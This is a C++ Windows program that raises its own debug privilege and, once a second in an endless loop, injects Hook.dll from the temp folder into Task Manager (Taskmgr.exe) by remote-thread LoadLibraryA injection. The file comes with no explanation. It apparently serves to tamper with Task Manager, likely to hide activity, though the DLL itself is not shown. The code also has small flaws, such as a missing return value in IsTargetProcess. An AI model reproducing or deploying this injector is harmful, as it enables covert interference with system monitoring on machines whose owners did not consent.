#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <tchar.h>
#include <iostream>
#include <string>
#include <Shlwapi.h>
#include <strsafe.h>
#include <Iphlpapi.h>
#include <Tlhelp32.h>
#include "resource.h"

#pragma comment(lib,"shlwapi.lib")

using namespace std;

bool IsTargetProcess(CHAR* pszName) {
	if (strcmp(pszName, "Taskmgr.exe") == 0)
		return true;
}
BOOL EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL))
    {
        return FALSE;
    }

    if (!CloseHandle(hToken))
    {
        return FALSE;
    }

    return TRUE;
}

BOOL WINAPI InjectLib(DWORD dwProcessId, LPCSTR pszLibFile, PSECURITY_ATTRIBUTES pSecAttr) {

    BOOL fOk = FALSE; // Assume that the function fails
    HANDLE hProcess = NULL, hRemoteThread = NULL;
    PSTR pszLibFileRemote = NULL;

    __try
    {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

        if (hProcess == NULL)
            __leave;
        
        // Calculate the number of bytes needed for the DLL's pathname
        int cch = 1 + strlen(pszLibFile);

        // Allocate space in the remote process for the pathname
        pszLibFileRemote = (PSTR)VirtualAllocEx(hProcess, NULL, cch, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (pszLibFileRemote == NULL)
            __leave;
        
        // Copy the DLL's pathname to the remote process's address space
        if (!WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, cch, NULL))
            __leave;
        
        // Get the real address of LoadLibraryW in Kernel32.dll
        PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryA");

        if (pfnThreadRtn == NULL) 
            __leave;

        hRemoteThread = CreateRemoteThread(hProcess, NULL, NULL, pfnThreadRtn, pszLibFileRemote, NULL, NULL);

        if (hRemoteThread == NULL)
            __leave;
        // Wait until the remote thread is done loading the dll.
        WaitForSingleObject(hRemoteThread, INFINITE);
        fOk = true;
    }

    __finally
    {
        if (pszLibFileRemote != NULL)
            VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);

        if (hRemoteThread != NULL)
            CloseHandle(hRemoteThread);

        if (hProcess != NULL)
            CloseHandle(hProcess);
    }

    return(fOk);
}
 BOOL InstalHookDll(char* pDllPath)
{
    HANDLE hSnapshot = NULL;
    PROCESSENTRY32 pe;

    LPCSTR pDllName = strrchr(pDllPath, '\\');
    pDllName++;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    pe.dwSize = sizeof(pe);

    Process32First(hSnapshot, &pe);
    do
    {
        MODULEENTRY32 ModuleEntry;
        HANDLE hModule = INVALID_HANDLE_VALUE;
        ModuleEntry.dwSize = sizeof(ModuleEntry);
        hModule = INVALID_HANDLE_VALUE;
        bool ExistMon = false;

        if (IsTargetProcess(pe.szExeFile))
        {
            hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);
            BOOL bNextModule = Module32First(hModule, &ModuleEntry);
            while (bNextModule)
            {
                if (_stricmp(ModuleEntry.szModule, pDllName) == 0)
                {
                    ExistMon = true;
                }
                bNextModule = Module32Next(hModule, &ModuleEntry);
            }

            if (!ExistMon)
            {
                InjectLib(pe.th32ProcessID, pDllPath, NULL);
            }

            CloseHandle(hModule);
            break;
        }


    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);

    return TRUE;
}
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
{
    EnableDebugPrivilege();
    CHAR szDLLFile[MAX_PATH] = { 0 };
    CHAR szDLLName[MAX_PATH] = { 0 };

    StringCbCopy(szDLLName, sizeof(szDLLName), "Hook.dll");

    GetTempPath(MAX_PATH, szDLLFile);
    StringCbCat(szDLLFile, sizeof(szDLLFile), szDLLName);
    
    while (true) {
        InstalHookDll(szDLLFile);
        Sleep(1000);
    }
    return 0;
}